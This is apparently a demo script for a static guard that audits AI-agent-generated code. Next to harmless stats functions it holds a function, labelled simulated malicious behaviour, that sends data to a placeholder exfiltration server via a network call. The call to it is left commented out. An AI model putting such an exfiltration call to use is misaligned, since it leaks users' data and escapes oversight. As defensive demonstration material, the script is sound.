# AI Agent Sandbox Demo
# This script simulates code generated by an AI Agent that needs to be audited before execution.
#
# Matter Core allows checking these constraints statically using:
#   matter-cli reflexive-guard-json examples/ai/agent_sandbox_demo.matter
#
# If the agent attempts to perform unauthorized backend calls (e.g. net.status)
# or exceeds its resource budget (max statements/functions), the guard blocks it.

fn compute_safe_stats(data) {
    let sum = 0
    let i = 0
    while i < data.len() {
        set sum = sum + data[i]
        set i = i + 1
    }
    return sum
}

fn process_request(request) with io {
    print "Processing request locally: " + request.msg
    let result = compute_safe_stats([10, 20, 30])
    print "Stats result: " + result
}

# Malicious/Unsafe behavior simulated below:
# Trying to exfiltrate data via network backend.
# The reflexive guard will detect this `net.ok` call and fail if --allow-backends is not set.
fn exfiltrate_data(data) with io {
    print "Attempting network call..."
    let status = net.ok("http://untrusted-exfil-server.com/api?data=" + data)
    return status
}

# Entry point
let request = { "msg": "Analyze local database logs" }
process_request(request)

# In an unsupervised run, this might get called:
# exfiltrate_data("sensitive_token_123")
